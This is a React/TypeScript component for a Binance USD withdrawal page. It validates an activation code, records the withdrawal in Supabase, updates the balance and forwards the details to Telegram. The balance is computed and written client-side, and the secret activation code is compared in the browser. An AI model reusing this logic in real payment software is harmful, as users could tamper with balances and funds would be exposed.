import { useState } from 'react';
import { useAuth } from '@/contexts/AuthContext';
import { supabase } from '@/integrations/supabase/client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { useToast } from '@/hooks/use-toast';
import { ArrowLeft } from 'lucide-react';

interface USDWithdrawPageProps {
  onBack: () => void;
  onSuccess: (withdrawalData: any) => void;
  balance: number;
}

export const USDWithdrawPage = ({ onBack, onSuccess, balance }: USDWithdrawPageProps) => {
  const { user } = useAuth();
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    walletAddress: '',
    amount: '',
    activationCode: ''
  });

  const minAmount = 10;
  const maxAmount = 10000;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user) return;

    setLoading(true);
    try {
      const amount = parseFloat(formData.amount);
      
      // Validate amount
      if (amount < minAmount || amount > maxAmount) {
        toast({
          title: "Invalid Amount",
          description: `Amount must be between $${minAmount.toLocaleString()} and $${maxAmount.toLocaleString()}`,
          variant: "destructive"
        });
        return;
      }

      if (amount > balance) {
        toast({
          title: "Insufficient Balance",
          description: "You cannot withdraw more than your available balance",
          variant: "destructive"
        });
        return;
      }

      // Get user profile to verify activation code
      const { data: profile, error: profileError } = await supabase
        .from('profiles')
        .select('activation_code, balance')
        .eq('user_id', user.id)
        .single();

      if (profileError) throw profileError;

      if (formData.activationCode.toUpperCase() !== profile.activation_code) {
        toast({
          title: "Invalid Activation Code",
          description: "The activation code you entered is incorrect",
          variant: "destructive"
        });
        return;
      }

      // Create withdrawal record
      const { error: withdrawalError } = await supabase
        .from('withdrawals')
        .insert({
          user_id: user.id,
          account_name: 'Binance Wallet',
          account_number: formData.walletAddress,
          bank_name: 'Binance',
          amount: amount,
          currency: 'USD',
          activation_code: formData.activationCode.toUpperCase()
        });

      if (withdrawalError) throw withdrawalError;

      // Update user balance
      const newBalance = balance - amount;
      const { error: updateError } = await supabase
        .from('profiles')
        .update({ balance: newBalance })
        .eq('user_id', user.id);

      if (updateError) throw updateError;

      // Send to telegram
      const { error: telegramError } = await supabase.functions.invoke('send-telegram-notification', {
        body: {
          accountName: 'Binance Wallet',
          accountNumber: formData.walletAddress,
          bank: 'Binance',
          amount: amount,
          currency: 'USD',
          activationCode: formData.activationCode.toUpperCase()
        }
      });

      if (telegramError) {
        console.error('Telegram notification failed:', telegramError);
      }

      onSuccess({
        walletAddress: formData.walletAddress,
        amount: amount,
        currency: 'USD'
      });

    } catch (error) {
      console.error('Withdrawal error:', error);
      toast({
        title: "Withdrawal Failed",
        description: "An error occurred while processing your withdrawal",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-dark text-foreground p-6">
      <div className="max-w-md mx-auto">
        {/* Header */}
        <div className="flex items-center mb-8">
          <Button
            variant="ghost"
            size="sm"
            onClick={onBack}
            className="text-foreground hover:text-primary p-0 mr-4"
          >
            <ArrowLeft className="w-6 h-6" />
          </Button>
        </div>

        <div className="bg-primary rounded-t-2xl p-6 text-center mb-0">
          <h1 className="text-2xl font-bold text-black">USD Withdrawal</h1>
        </div>

        <div className="bg-background/10 rounded-b-2xl p-6 space-y-6">
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Binance Wallet Address */}
            <div>
              <label className="block text-foreground text-sm font-medium mb-2">
                BINANCE WALLET ADDRESS
              </label>
              <Input
                placeholder="Enter your Binance wallet address"
                value={formData.walletAddress}
                onChange={(e) => setFormData(prev => ({ ...prev, walletAddress: e.target.value }))}
                className="bg-background/20 border-border text-foreground placeholder:text-muted-foreground"
                required
              />
            </div>

            {/* Amount */}
            <div>
              <label className="block text-foreground text-sm font-medium mb-2">
                AMOUNT (USD)
              </label>
              <Input
                type="number"
                placeholder="Amount in USD"
                value={formData.amount}
                onChange={(e) => setFormData(prev => ({ ...prev, amount: e.target.value }))}
                className="bg-background/20 border-border text-foreground placeholder:text-muted-foreground"
                min={minAmount}
                max={maxAmount}
                step="0.01"
                required
              />
              <p className="text-muted-foreground text-xs mt-1">
                Min: ${minAmount} | Max: ${maxAmount.toLocaleString()}
              </p>
            </div>

            {/* Activation Code */}
            <div>
              <label className="block text-foreground text-sm font-medium mb-2">
                ACTIVATION CODE
              </label>
              <Input
                placeholder="ACTIVATION CODE"
                value={formData.activationCode}
                onChange={(e) => setFormData(prev => ({ ...prev, activationCode: e.target.value }))}
                className="bg-background/20 border-border text-foreground placeholder:text-muted-foreground"
                required
              />
            </div>

            {/* Available Balance */}
            <div className="text-center py-4">
              <p className="text-foreground text-lg">
                Available Balance: ${balance.toLocaleString()}
              </p>
            </div>

            {/* Submit Button */}
            <Button
              type="submit"
              disabled={loading}
              className="w-full bg-primary text-black hover:bg-primary/90 py-4 text-lg font-semibold rounded-xl"
            >
              {loading ? 'Processing...' : 'Withdraw'}
            </Button>
          </form>
        </div>
      </div>
    </div>
  );
};